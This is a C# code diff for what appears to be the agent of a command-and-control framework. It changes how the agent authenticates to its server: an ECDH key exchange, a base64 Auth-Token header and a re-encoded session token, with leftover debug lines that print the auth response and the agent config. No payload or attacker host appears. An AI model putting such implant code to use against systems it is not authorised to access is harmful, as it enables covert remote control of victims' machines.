@@ -18,6 +18,7 @@ using Agent.Core.Utils;
 using System.Security.Cryptography;
 using Agent.Core.Utils.Encryption;
 using System.Text.Json.Serialization;
+using System.Text;
 
 // #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
@@ -52,22 +53,25 @@ var (privKey, pubKey) = ECDHUtils.GenerateECDHKeyPair();
 
 var authRequest = new C2Request
 {
-    Reason = C2RequestReason.Authenticate,
-    AgentId = baseConfig.AgentId,
-    ConfigId = baseConfig.AgentConfigId,
     Message = Convert.ToBase64String(pubKey)
 };
 
+baseCommunicationService.SetHeader("Auth-Token", Convert.ToBase64String(Encoding.UTF8.GetBytes(baseConfig.Token)));
+
 var authResponse = baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(authRequest));
+baseCommunicationService.ClearHeaders(); // Clear the auth token header
+
 // TEMP
 Console.WriteLine(authResponse.Result);
 //
+
+
 var decodedAuthResponse = JsonSerializer.Deserialize<AuthenticationResponse>(authResponse.Result);
 
 var peerPublicKey = Convert.FromBase64String(decodedAuthResponse.PublicKey);
 byte[] sharedSecret = ECDHUtils.DeriveECDHSharedSecret(privKey, peerPublicKey);
 
-baseCommunicationService.SetHeader("Session-Token", decodedAuthResponse.SessionToken);
+baseCommunicationService.SetHeader("Session-Token", Convert.ToBase64String(Encoding.UTF8.GetBytes(decodedAuthResponse.SessionToken)));
 
 // TEMP
 string jsonOutput = JsonSerializer.Serialize(baseConfig);
